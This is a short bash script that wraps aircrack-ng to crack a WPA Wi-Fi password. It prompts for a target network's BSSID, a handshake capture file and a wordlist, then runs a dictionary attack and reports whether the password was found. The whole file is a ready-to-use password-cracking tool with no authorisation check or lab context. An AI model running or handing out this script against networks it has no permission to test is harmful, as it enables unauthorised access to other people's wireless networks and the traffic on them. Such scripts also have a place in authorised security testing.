#!/bin/bash

# Aircrack-ng WiFi Cracking Script

echo "Aircrack-ng WiFi Cracking Script"
echo "--------------------------------"

# Prompt user for necessary information
read -p "Enter the target BSSID (MAC address): " bssid
read -p "Enter the path to the capture file (cap format): " capfile
read -p "Enter the path to the wordlist file: " wordlist

# Check if the capture file and wordlist exist
if [ ! -f "$capfile" ]; then
    echo "Capture file not found: $capfile"
    exit 1
fi

if [ ! -f "$wordlist" ]; then
    echo "Wordlist file not found: $wordlist"
    exit 1
fi

# Run aircrack-ng with the provided information
echo "Starting WiFi password cracking..."
aircrack-ng -a 2 -b "$bssid" -w "$wordlist" "$capfile"

# Check the exit status of aircrack-ng
if [ $? -eq 0 ]; then
    echo "Cracking successful! Password found."
else
    echo "Cracking failed. Password not found."
fi
